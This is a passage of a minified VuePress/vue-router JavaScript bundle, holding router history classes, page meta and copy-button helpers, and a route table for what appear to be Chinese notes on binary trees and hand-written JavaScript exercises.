e=B(this.base+this.current.fullPath);n?bn(e):En(e)}},e.prototype.getCurrentLocation=function(){return Ln(this.base)},e}(zn);function Ln(n){var e=window.location.pathname,t=e.toLowerCase(),r=n.toLowerCase();return!n||t!==r&&0!==t.indexOf(B(r+"/"))||(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var Mn=function(n){function e(e,t,r){n.call(this,e,t),r&&function(n){var e=Ln(n);if(!/^\/#/.test(e))return window.location.replace(B(n+"/#"+e)),!0}(this.base)||Vn()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=gn&&e;t&&this.listeners.push(ln());var r=function(){var e=n.current;Vn()&&n.transitionTo(Rn(),(function(r){t&&cn(n.router,r,e,!0),gn||Nn(r.fullPath)}))},o=gn?"popstate":"hashchange";window.addEventListener(o,r),this.listeners.push((function(){window.removeEventListener(o,r)}))}},e.prototype.push=function(n,e,t){var r=this,o=this.current;this.transitionTo(n,(function(n){Hn(n.fullPath),cn(r.router,n,o,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,o=this.current;this.transitionTo(n,(function(n){Nn(n.fullPath),cn(r.router,n,o,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;Rn()!==e&&(n?Hn(e):Nn(e))},e.prototype.getCurrentLocation=function(){return Rn()},e}(zn);function Vn(){var n=Rn();return"/"===n.charAt(0)||(Nn("/"+n),!1)}function Rn(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function qn(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function Hn(n){gn?bn(qn(n)):window.location.hash=n}function Nn(n){gn?En(qn(n)):window.location.replace(qn(n))}var Un=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index+1).concat(n),r.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var r=this.stack[t];this.confirmTransition(r,(function(){var n=e.current;e.index=t,e.updateRoute(r),e.router.afterHooks.forEach((function(e){e&&e(r,n)}))}),(function(n){Tn(n,wn.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(zn),Jn=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=Z(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!gn&&!1!==n.fallback,this.fallback&&(e="hash"),K||(e="abstract"),this.mode=e,e){case"history":this.history=new $n(this,n.base);break;case"hash":this.history=new Mn(this,n.base,this.fallback);break;case"abstract":this.history=new Un(this,n.base);break;default:0}},Wn={currentRoute:{configurable:!0}};function Xn(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}Jn.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},Wn.currentRoute.get=function(){return this.history&&this.history.current},Jn.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof $n||t instanceof Mn){var r=function(n){t.setupListeners(),function(n){var r=t.current,o=e.options.scrollBehavior;gn&&o&&"fullPath"in n&&cn(e,n,r,!1)}(n)};t.transitionTo(t.getCurrentLocation(),r,r)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},Jn.prototype.beforeEach=function(n){return Xn(this.beforeHooks,n)},Jn.prototype.beforeResolve=function(n){return Xn(this.resolveHooks,n)},Jn.prototype.afterEach=function(n){return Xn(this.afterHooks,n)},Jn.prototype.onReady=function(n,e){this.history.onReady(n,e)},Jn.prototype.onError=function(n){this.history.onError(n)},Jn.prototype.push=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.push(n,e,t)}));this.history.push(n,e,t)},Jn.prototype.replace=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.replace(n,e,t)}));this.history.replace(n,e,t)},Jn.prototype.go=function(n){this.history.go(n)},Jn.prototype.back=function(){this.go(-1)},Jn.prototype.forward=function(){this.go(1)},Jn.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},Jn.prototype.resolve=function(n,e,t){var r=U(n,e=e||this.history.current,t,this),o=this.match(r,e),a=o.redirectedFrom||o.fullPath;return{location:r,route:o,href:function(n,e,t){var r="hash"===t?"#"+e:e;return n?B(n+"/"+r):r}(this.history.base,a,this.mode),normalizedTo:r,resolved:o}},Jn.prototype.getRoutes=function(){return this.matcher.getRoutes()},Jn.prototype.addRoute=function(n,e){this.matcher.addRoute(n,e),this.history.current!==y&&this.history.transitionTo(this.history.getCurrentLocation())},Jn.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==y&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(Jn.prototype,Wn),Jn.install=function n(e){if(!n.installed||J!==e){n.installed=!0,J=e;var t=function(n){return void 0!==n},r=function(n,e){var r=n.$options._parentVnode;t(r)&&t(r=r.data)&&t(r=r.registerRouteInstance)&&r(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,r(this,this)},destroyed:function(){r(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",k),e.component("RouterLink",X);var o=e.config.optionMergeStrategies;o.beforeRouteEnter=o.beforeRouteLeave=o.beforeRouteUpdate=o.created}},Jn.version="3.5.3",Jn.isNavigationFailure=Tn,Jn.NavigationFailureType=wn,Jn.START_LOCATION=y,K&&window.Vue&&window.Vue.use(Jn);var Gn=Jn;t(211),t(155),t(236),t(119),t(212),t(90),t(91),t(238);function Kn(n){n.locales&&Object.keys(n.locales).forEach((function(e){n.locales[e].path=e})),Object.freeze(n)}var Yn=t(79),Qn=t(57),Zn=(t(165),t(33),t(88),t(204),t(205),t(30),t(29),{NotFound:function(){return t.e(13).then(t.bind(null,456))},Layout:function(){return Promise.all([t.e(0),t.e(2)]).then(t.bind(null,454))}}),ne={"v-8ec5a598":function(){return t.e(17).then(t.bind(null,461))},"v-335c11a2":function(){return t.e(14).then(t.bind(null,462))},"v-4c65533e":function(){return t.e(16).then(t.bind(null,463))},"v-b0942ea8":function(){return t.e(19).then(t.bind(null,464))},"v-5cf39b7b":function(){return t.e(15).then(t.bind(null,465))},"v-0ac26bb5":function(){return t.e(20).then(t.bind(null,466))},"v-fcb756ba":function(){return t.e(24).then(t.bind(null,467))},"v-8f072a64":function(){return t.e(21).then(t.bind(null,468))},"v-654671c3":function(){return t.e(23).then(t.bind(null,469))},"v-c8550c00":function(){return t.e(18).then(t.bind(null,470))},"v-481f32c4":function(){return t.e(25).then(t.bind(null,471))},"v-da74fa72":function(){return t.e(22).then(t.bind(null,472))},"v-71b21db6":function(){return t.e(27).then(t.bind(null,473))},"v-488f3082":function(){return t.e(28).then(t.bind(null,474))},"v-e8b96868":function(){return t.e(29).then(t.bind(null,475))},"v-60a40125":function(){return t.e(30).then(t.bind(null,476))},"v-37a6fbbc":function(){return t.e(33).then(t.bind(null,477))},"v-1834bbf3":function(){return t.e(31).then(t.bind(null,478))},"v-3636c130":function(){return t.e(34).then(t.bind(null,479))},"v-792a7262":function(){return t.e(35).then(t.bind(null,480))},"v-dd1c97bc":function(){return t.e(36).then(t.bind(null,481))},"v-772bea3a":function(){return t.e(37).then(t.bind(null,482))},"v-67b513d6":function(){return t.e(26).then(t.bind(null,483))},"v-2e77ec4c":function(){return t.e(38).then(t.bind(null,484))},"v-5ea312a7":function(){return t.e(32).then(t.bind(null,485))},"v-63a30bf0":function(){return t.e(39).then(t.bind(null,486))},"v-1f9cab6c":function(){return t.e(43).then(t.bind(null,487))},"v-8737a776":function(){return t.e(40).then(t.bind(null,488))},"v-87ba4012":function(){return t.e(41).then(t.bind(null,489))},"v-3359d280":function(){return t.e(44).then(t.bind(null,490))},"v-3761fc08":function(){return t.e(45).then(t.bind(null,491))},"v-c68b6434":function(){return t.e(46).then(t.bind(null,492))},"v-6669fe90":function(){return t.e(47).then(t.bind(null,493))},"v-4e2bb218":function(){return t.e(48).then(t.bind(null,494))},"v-b97afcba":function(){return t.e(50).then(t.bind(null,495))},"v-e451ceda":function(){return t.e(42).then(t.bind(null,496))},"v-b3858932":function(){return t.e(51).then(t.bind(null,497))},"v-069b9fca":function(){return t.e(52).then(t.bind(null,498))},"v-5e76828e":function(){return t.e(53).then(t.bind(null,499))},"v-7198a9df":function(){return t.e(54).then(t.bind(null,500))},"v-6d59cd32":function(){return t.e(56).then(t.bind(null,501))},"v-d45d5bf2":function(){return t.e(55).then(t.bind(null,502))},"v-5ae5e296":function(){return t.e(57).then(t.bind(null,503))},"v-3310d7e8":function(){return t.e(58).then(t.bind(null,504))},"v-42916c76":function(){return t.e(60).then(t.bind(null,505))},"v-9b6bab4e":function(){return t.e(59).then(t.bind(null,506))},"v-64357012":function(){return t.e(61).then(t.bind(null,507))},"v-6fa45728":function(){return t.e(62).then(t.bind(null,508))},"v-2c8f5265":function(){return t.e(63).then(t.bind(null,509))},"v-741233c4":function(){return t.e(64).then(t.bind(null,510))},"v-30d3c3c0":function(){return t.e(66).then(t.bind(null,511))},"v-230a2f15":function(){return t.e(67).then(t.bind(null,512))},"v-4d586035":function(){return t.e(68).then(t.bind(null,513))},"v-60d5aae6":function(){return t.e(69).then(t.bind(null,514))},"v-e5190fc2":function(){return t.e(70).then(t.bind(null,515))},"v-53a95d9b":function(){return t.e(65).then(t.bind(null,516))},"v-3fa08b8f":function(){return t.e(72).then(t.bind(null,517))},"v-7b7cad34":function(){return t.e(74).then(t.bind(null,518))},"v-4554a115":function(){return t.e(49).then(t.bind(null,519))},"v-6a9e8fe1":function(){return t.e(77).then(t.bind(null,520))},"v-779e2c82":function(){return t.e(73).then(t.bind(null,521))},"v-06e03a62":function(){return t.e(75).then(t.bind(null,522))},"v-7ee75026":function(){return t.e(76).then(t.bind(null,523))},"v-4e60d9bf":function(){return t.e(71).then(t.bind(null,524))},"v-1cadf89a":function(){return t.e(81).then(t.bind(null,525))},"v-0424bdf4":function(){return t.e(79).then(t.bind(null,526))},"v-7ea5908c":function(){return t.e(83).then(t.bind(null,527))},"v-70951521":function(){return t.e(82).then(t.bind(null,528))},"v-2bef01e8":function(){return t.e(78).then(t.bind(null,529))},"v-1a493651":function(){return t.e(80).then(t.bind(null,530))},"v-03980d56":function(){return t.e(85).then(t.bind(null,531))},"v-7550340d":function(){return t.e(86).then(t.bind(null,532))},"v-3eb3b24c":function(){return t.e(92).then(t.bind(null,533))},"v-59f4c2ee":function(){return t.e(91).then(t.bind(null,534))},"v-47ace465":function(){return t.e(94).then(t.bind(null,535))},"v-22109f78":function(){return t.e(84).then(t.bind(null,536))},"v-5dce9a2e":function(){return t.e(95).then(t.bind(null,537))},"v-f3eb5e7c":function(){return t.e(93).then(t.bind(null,538))},"v-9281c836":function(){return t.e(87).then(t.bind(null,539))},"v-7e65d116":function(){return t.e(88).then(t.bind(null,540))},"v-2725f445":function(){return t.e(89).then(t.bind(null,541))},"v-3e82da48":function(){return t.e(90).then(t.bind(null,542))}};function ee(n){var e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}var te=/-(\w)/g,re=ee((function(n){return n.replace(te,(function(n,e){return e?e.toUpperCase():""}))})),oe=/\B([A-Z])/g,ae=ee((function(n){return n.replace(oe,"-$1").toLowerCase()})),ie=ee((function(n){return n.charAt(0).toUpperCase()+n.slice(1)}));function se(n,e){if(e)return n(e)?n(e):e.includes("-")?n(ie(re(e))):n(ie(e))||n(ae(e))}var le=Object.assign({},Zn,ne),ce=function(n){return le[n]},ue=function(n){return ne[n]},de=function(n){return Zn[n]},pe=function(n){return o.a.component(n)};function fe(n){return se(ue,n)}function he(n){return se(de,n)}function me(n){return se(ce,n)}function ve(n){return se(pe,n)}function ye(){for(var n=arguments.length,e=new Array(n),t=0;t<n;t++)e[t]=arguments[t];return Promise.all(e.filter((function(n){return n})).map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(ve(e)||!me(e)){n.next=5;break}return n.next=3,me(e)();case 3:t=n.sent,o.a.component(e,t.default);case 5:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()))}function ge(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var be=t(118),Ee=(t(251),t(201),t(206),t(191)),xe=t.n(Ee),we=t(192),ke=t.n(we),Ae={created:function(){if(this.siteMeta=this.$site.headTags.filter((function(n){return"meta"===Object(be.a)(n,1)[0]})).map((function(n){var e=Object(be.a)(n,2);e[0];return e[1]})),this.$ssrContext){var n=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(e=n)?e.map((function(n){var e="<meta";return Object.keys(n).forEach((function(t){e+=" ".concat(t,'="').concat(ke()(n[t]),'"')})),e+">"})).join("\n    "):"",this.$ssrContext.canonicalLink=Be(this.$canonicalUrl)}var e},mounted:function(){this.currentMetaTags=Object(Qn.a)(document.querySelectorAll("meta")),this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta:function(){document.title=this.$title,document.documentElement.lang=this.$lang;var n=this.getMergedMetaTags();this.currentMetaTags=Ce(n,this.currentMetaTags)},getMergedMetaTags:function(){var n=this.$page.frontmatter.meta||[];return xe()([{name:"description",content:this.$description}],n,this.siteMeta,Te)},updateCanonicalLink:function(){je(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",Be(this.$canonicalUrl))}},watch:{$page:function(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy:function(){Ce(null,this.currentMetaTags),je()}};function je(){var n=document.querySelector("link[rel='canonical']");n&&n.remove()}function Be(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return n?'<link href="'.concat(n,'" rel="canonical" />'):""}function Ce(n,e){if(e&&Object(Qn.a)(e).filter((function(n){return n.parentNode===document.head})).forEach((function(n){return document.head.removeChild(n)})),n)return n.map((function(n){var e=document.createElement("meta");return Object.keys(n).forEach((function(t){e.setAttribute(t,n[t])})),document.head.appendChild(e),e}))}function Te(n){for(var e=0,t=["name","property","itemprop"];e<t.length;e++){var r=t[e];if(n.hasOwnProperty(r))return n[r]+r}return JSON.stringify(n)}t(122);var Se=t(193),_e={mounted:function(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(Se)()((function(){this.setActiveHash()}),300),setActiveHash:function(){for(var n=this,e=[].slice.call(document.querySelectorAll(".sidebar-link")),t=[].slice.call(document.querySelectorAll(".header-anchor")).filter((function(n){return e.some((function(e){return e.hash===n.hash}))})),r=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),o=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),a=window.innerHeight+r,i=0;i<t.length;i++){var s=t[i],l=t[i+1],c=0===i&&0===r||r>=s.parentElement.offsetTop+10&&(!l||r<l.parentElement.offsetTop-10),u=decodeURIComponent(this.$route.hash);if(c&&u!==decodeURIComponent(s.hash)){var d=s;if(a===o)for(var p=i+1;p<t.length;p++)if(u===decodeURIComponent(t[p].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(d.hash),(function(){n.$nextTick((function(){n.$vuepress.$set("disableScrollBehavior",!1)}))}))}}}},beforeDestroy:function(){window.removeEventListener("scroll",this.onScroll)}},Pe=(t(216),t(346),{data:function(){return{zoom:null}},mounted:function(){this.updateCopy()},updated:function(){this.updateCopy()},methods:{updateCopy:function(){var n=this;setTimeout((function(){document.querySelectorAll('div[class*="language-"]').forEach(n.generateCopyButton)}),1e3)},generateCopyButton:function(n){var e=this;if(!n.classList.contains("codecopy-enabled")){var t=document.createElement("span");t.className="code-copy",t.title="Click to Copy to Clipboard",t.addEventListener("click",(function(){e.copyToClipboard(n.innerText),t.classList.add("copied");var r=setTimeout((function(){t.classList.remove("copied"),clearTimeout(r)}),2e3)})),n.appendChild(t),n.classList.add("codecopy-enabled")}},copyToClipboard:function(n){var e=document.createElement("textarea");e.value=n,e.setAttribute("readonly",""),e.style.position="absolute",e.style.left="-9999px",document.body.appendChild(e);var t=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);e.select(),document.execCommand("copy"),document.body.removeChild(e),t&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(t))}}}),Oe=(t(95),t(86)),Ie=t.n(Oe),ze=[Ae,_e,Pe,{mounted:function(){var n=this;Ie.a.configure({showSpinner:!1}),this.$router.beforeEach((function(n,e,t){n.path===e.path||o.a.component(n.name)||Ie.a.start(),t()})),this.$router.afterEach((function(){Ie.a.done(),n.isSidebarOpen=!1}))}}],De={name:"GlobalLayout",computed:{layout:function(){var n=this.getLayout();return ge("layout",n),o.a.component(n)}},methods:{getLayout:function(){if(this.$page.path){var n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},Fe=t(59),$e=Object(Fe.a)(De,(function(){var n=this.$createElement;return(this._self._c||n)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){var r;switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),(r=n[e]).push.apply(r,Object(Qn.a)(t));break;default:throw new Error("Unknown option name.")}}($e,"mixins",ze);var Le=[{name:"v-8ec5a598",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%AE%BD%E5%BA%A6.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-8ec5a598").then(t)}},{path:"/dataStructure/二叉树/二叉树的宽度.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%AE%BD%E5%BA%A6.html"},{path:"/dataStructure/二叉树/二叉树的宽度.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%AE%BD%E5%BA%A6.html"},{name:"v-335c11a2",path:"/",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-335c11a2").then(t)}},{path:"/index.html",redirect:"/"},{name:"v-4c65533e",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-4c65533e").then(t)}},{path:"/dataStructure/二叉树/中序遍历.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.html"},{path:"/dataStructure/二叉树/中序遍历.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.html"},{name:"v-b0942ea8",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-b0942ea8").then(t)}},{path:"/dataStructure/二叉树/后序遍历.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.html"},{path:"/dataStructure/二叉树/后序遍历.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.html"},{name:"v-5cf39b7b",path:"/dataStructure/",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-5cf39b7b").then(t)}},{path:"/dataStructure/index.html",redirect:"/dataStructure/"},{name:"v-0ac26bb5",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-0ac26bb5").then(t)}},{path:"/dataStructure/二叉树/层序遍历.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86.html"},{path:"/dataStructure/二叉树/层序遍历.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86.html"},{name:"v-fcb756ba",path:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-fcb756ba").then(t)}},{path:"/dataStructure/树简介/深度优先遍历.html",redirect:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html"},{path:"/dataStructure/树简介/深度优先遍历.html",redirect:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html"},{name:"v-8f072a64",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E5%B0%8F%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-8f072a64").then(t)}},{path:"/dataStructure/二叉树/最小最大深度.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E5%B0%8F%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6.html"},{path:"/dataStructure/二叉树/最小最大深度.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E5%B0%8F%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6.html"},{name:"v-654671c3",path:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-654671c3").then(t)}},{path:"/dataStructure/树简介/广度优先遍历.html",redirect:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html"},{path:"/dataStructure/树简介/广度优先遍历.html",redirect:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html"},{name:"v-c8550c00",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-c8550c00").then(t)}},{path:"/dataStructure/二叉树/前序遍历.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.html"},{path:"/dataStructure/二叉树/前序遍历.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.html"},{name:"v-481f32c4",path:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E7%AE%80%E4%BB%8B.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-481f32c4").then(t)}},{path:"/dataStructure/树简介/简介.html",redirect:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E7%AE%80%E4%BB%8B.html"},{path:"/dataStructure/树简介/简介.html",redirect:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E7%AE%80%E4%BB%8B.html"},{name:"v-da74fa72",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-da74fa72").then(t)}},{path:"/dataStructure/二叉树/重建二叉树.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.html"},{path:"/dataStructure/二叉树/重建二叉树.html",redirect:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.html"},{name:"v-71b21db6",path:"/javascript/Array%E5%8E%BB%E9%87%8D%E6%89%81%E5%B9%B3%E5%8C%96.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-71b21db6").then(t)}},{path:"/javascript/Array去重扁平化.html",redirect:"/javascript/Array%E5%8E%BB%E9%87%8D%E6%89%81%E5%B9%B3%E5%8C%96.html"},{path:"/javascript/Array去重扁平化.html",redirect:"/javascript/Array%E5%8E%BB%E9%87%8D%E6%89%81%E5%B9%B3%E5%8C%96.html"},{name:"v-488f3082",path:"/javascript/",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-488f3082").then(t)}},{path:"/javascript/index.html",redirect:"/javascript/"},{name:"v-e8b96868",path:"/javascript/add(1)(2)(3).html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-e8b96868").then(t)}},{name:"v-60a40125",path:"/javascript/for%20in%E5%92%8Cfor%20of.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-60a40125").then(t)}},{path:"/javascript/for in和for of.html",redirect:"/javascript/for%20in%E5%92%8Cfor%20of.html"},{path:"/javascript/for in和for of.html",redirect:"/javascript/for%20in%E5%92%8Cfor%20of.html"},{name:"v-37a6fbbc",path:"/javascript/%E6%89%8B%E5%86%99Ajax.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-37a6fbbc").then(t)}},{path:"/javascript/手写Ajax.html",redirect:"/javascript/%E6%89%8B%E5%86%99Ajax.html"},{path:"/javascript/手写Ajax.html",redirect:"/javascript/%E6%89%8B%E5%86%99Ajax.html"},{name:"v-1834bbf3",path:"/javascript/for%E5%92%8CforEach%E8%B0%81%E6%9B%B4%E5%BF%AB.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-1834bbf3").then(t)}},{path:"/javascript/for和forEach谁更快.html",redirect:"/javascript/for%E5%92%8CforEach%E8%B0%81%E6%9B%B4%E5%BF%AB.html"},{path:"/javascript/for和forEach谁更快.html",redirect:"/javascript/for%E5%92%8CforEach%E8%B0%81%E6%9B%B4%E5%BF%AB.html"},{name:"v-3636c130",path:"/javascript/%E6%89%8B%E5%86%99call,bind,apply.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-3636c130").then(t)}},{path:"/javascript/手写call,bind,apply.html",redirect:"/javascript/%E6%89%8B%E5%86%99call,bind,apply.html"},{path:"/javascript/手写call,bind,apply.html",redirect:"/javascript/%E6%89%8B%E5%86%99call,bind,apply.html"},{name:"v-792a7262",path:"/javascript/%E6%89%8B%E5%86%99getType.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-792a7262").then(t)}},{path:"/javascript/手写getType.html",redirect:"/javascript/%E6%89%8B%E5%86%99getType.html"},{path:"/javascript/手写getType.html",redirect:"/javascript/%E6%89%8B%E5%86%99getType.html"},{name:"v-dd1c97bc",path:"/javascript/%E6%89%8B%E5%86%99instanceof.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-dd1c97bc").then(t)}},{path:"/javascript/手写instanceof.html",redirect:"/javascript/%E6%89%8B%E5%86%99instanceof.html"},{path:"/javascript/手写instanceof.html",redirect:"/javascript/%E6%89%8B%E5%86%99instanceof.html"},{name:"v-772bea3a",path:"/javascript/%E6%89%8B%E5%86%99new%E6%93%8D%E4%BD%9C%E7%AC%A6.html",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-772bea3a").then(t)}},{path:"/javascript/手写new操作符.html",redirect:"/javascript/%E6%89%8B%E5%86%99new%E6%93%8D%E4%BD%9C%E7%AC%A6.html"},{path:"/javascript/手写new操作符.html",redirect:"/javascript/%E6%89%8B%E5%86%99new%E6%93%8D%E4%BD%9C%E7%AC%A6.html"},{name:"v-67b513d6",path:"/guide/",component:$e,beforeEnter:function(n,e,t){ye("Layout","v-67b513d6").then(t)}},{path:"/guide/index.html",redirect:"/guide/"},{name:"v-2e77ec4c",path:"/javascript/%E6%89%8B%E5%86%99promise.